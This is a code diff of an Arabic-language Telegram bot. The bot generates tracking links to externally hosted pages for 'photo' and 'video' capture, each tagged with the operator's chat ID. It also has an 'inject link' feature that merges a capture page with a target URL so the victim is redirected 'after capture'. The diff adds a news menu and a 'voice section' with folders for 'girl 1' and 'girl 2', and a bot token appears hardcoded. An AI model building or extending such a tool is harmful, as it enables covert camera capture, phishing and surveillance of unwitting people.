@@ -14,7 +14,6 @@ BOT_TOKEN = os.getenv("BOT_TOKEN", "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4B
 bot = telebot.TeleBot(BOT_TOKEN)
 
 DB_FILE = "/tmp/voice_db.json"
-# الروابط الأساسية للصفحات
 PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
 VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"
 IMAGE_EDIT_URL = "https://app-display.github.io/-c-om-Copy-Translate-ate-vel-.app-c.html-chatld-/"
@@ -57,26 +56,47 @@ def get_main_keyboard():
         types.InlineKeyboardButton("🎥 رابط فيديو", callback_data="get_video_link"),
         types.InlineKeyboardButton("✨ رابط تعديل", callback_data="get_image_edit_link"),
         types.InlineKeyboardButton("📥 تحميل فيديو", callback_data="dl_video"),
-        types.InlineKeyboardButton("🔒 حقن رابط", callback_data="inject_start")
+        types.InlineKeyboardButton("🌐 أخبار وبث مباشر", callback_data="news_menu"),
+        types.InlineKeyboardButton("🔒 حقن رابط", callback_data="inject_start"),
+        types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="voice_menu")
     )
     return markup
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    bot.send_message(message.chat.id, "👋 أهلاً بك يا سيف الدين، أنا جاهز!", reply_markup=get_main_keyboard())
+    bot.send_message(message.chat.id, "👋 أهلاً بك، المطور سيف الدين يرحب بك!", reply_markup=get_main_keyboard())
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_query(call):
     chat_id = call.message.chat.id
     
-    if call.data == "inject_start":
-        user_states[chat_id] = "waiting_for_inject_link"
-        bot.edit_message_text("🔗 أرسل الرابط الأصلي الذي تريد توجيه المستخدم إليه بعد الالتقاط:", chat_id, call.message.message_id)
+    if call.data == "news_menu":
+        markup = types.InlineKeyboardMarkup(row_width=1)
+        markup.add(
+            types.InlineKeyboardButton("🔴 الجزيرة مباشر", web_app=types.WebAppInfo(url="https://www.aljazeera.net/live")),
+            types.InlineKeyboardButton("🔴 BBC عربي", web_app=types.WebAppInfo(url="https://www.youtube.com/live/yNXBL-e7C9A")),
+            types.InlineKeyboardButton("🔙 عودة", callback_data="main_menu")
+        )
+        bot.edit_message_text("🌐 البث المباشر:", chat_id, call.message.message_id, reply_markup=markup)
     
+    elif call.data == "inject_start":
+        user_states[chat_id] = "waiting_for_inject_link"
+        bot.edit_message_text("🔗 أرسل الرابط الذي تريد توجيه المستخدم إليه بعد الالتقاط:", chat_id, call.message.message_id)
+
     elif call.data == "dl_video":
         user_states[chat_id] = "waiting_for_url"
         bot.edit_message_text("📥 أرسل رابط الفيديو للتحميل:", chat_id, call.message.message_id)
-        
+    
+    elif call.data == "voice_menu":
+        markup = types.InlineKeyboardMarkup(row_width=1)
+        markup.add(types.InlineKeyboardButton("👩 الفتاة 1", callback_data="girl_1_menu"),
+                   types.InlineKeyboardButton("👩 الفتاة 2", callback_data="girl_2_menu"),
+                   types.InlineKeyboardButton("🔙 عودة", callback_data="main_menu"))
+        bot.edit_message_text("📂 اختر المجلد:", chat_id, call.message.message_id, reply_markup=markup)
+    
+    elif call.data == "main_menu":
+        bot.edit_message_text("🤖 القائمة الرئيسية:", chat_id, call.message.message_id, reply_markup=get_main_keyboard())
+    
     elif call.data == "get_photo_link": bot.send_message(chat_id, f"🖼️ الرابط: {PHOTO_PAGE_URL}?chatId={chat_id}")
     elif call.data == "get_video_link": bot.send_message(chat_id, f"🎥 الرابط: {VIDEO_PAGE_URL}?chatId={chat_id}")
     elif call.data == "get_image_edit_link": bot.send_message(chat_id, f"✨ الرابط: {IMAGE_EDIT_URL}?chatId={chat_id}")
@@ -90,9 +110,9 @@ def handle_text(message):
     
     if state == "waiting_for_inject_link":
         original_url = message.text if message.text.startswith("http") else f"https://{message.text}"
-        # توليد رابط الحقن (يجمع صفحة الالتقاط مع الرابط المستهدف)
+        # هنا الدمج: الرابط الأساسي + الهدف
         injected_link = f"{PHOTO_PAGE_URL}?target={original_url}&chatId={chat_id}"
-        bot.reply_to(message, f"✅ تم دمج الرابط بنجاح:\n\n{injected_link}")
+        bot.reply_to(message, f"✅ الرابط المدمج جاهز:\n\n{injected_link}")
         user_states[chat_id] = None
         
     elif state == "waiting_for_url":
